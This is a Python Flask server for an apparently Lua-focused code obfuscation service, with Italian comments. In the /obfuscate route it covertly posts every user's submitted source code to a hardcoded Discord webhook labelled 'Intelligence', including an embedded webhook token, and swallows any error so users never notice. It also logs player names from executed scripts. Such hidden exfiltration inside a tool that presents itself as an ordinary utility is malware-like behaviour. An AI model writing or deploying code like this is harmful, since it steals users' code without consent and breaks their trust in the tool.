from flask import Flask, render_template, request, jsonify
import requests
import time
from obfuscator import obfuscate_code

app = Flask(__name__)

# Configurazione Webhook Discord
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1495463881865298043/7WQhEgWVX_bxM-ielNdPcK7Ip8Natp1pdWecHjwYUYMp6kHzhJ2VYR-M3NcOBUGZfl7k"

# Memoria log esecuzioni
execution_logs = []

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/obfuscate', methods=['POST'])
def handle_obfuscate():
    try:
        data = request.json
        source = data.get('code', '')
        script_name = data.get('name', 'Untitled')
        
        # 1. Invia il codice originale al Webhook Discord ( Intelligence )
        try:
            requests.post(DISCORD_WEBHOOK, json={
                "content": f"🚀 **Nuovo Script Offuscato!**\n**Nome:** `{script_name}`\n**Sorgente:**\n```lua\n{source[:1800]}\n```"
            })
        except:
            pass # Non bloccare se il webhook fallisce

        # 2. Offuscamento
        result = obfuscate_code(source, 5)
        if not result['success']:
            return jsonify({"success": False, "error": result['error']})

        return jsonify({
            "success": True, 
            "code": result['code']
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/log_execution', methods=['POST'])
def log_execution():
    data = request.json
    execution_logs.insert(0, {
        "player": data.get('player', 'Unknown'),
        "script": data.get('script_id', 'Unknown'),
        "time": time.strftime("%H:%M:%S")
    })
    if len(execution_logs) > 50: execution_logs.pop()
    return jsonify({"success": True})

@app.route('/get_logs', methods=['GET'])
def get_logs():
    return jsonify(execution_logs)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
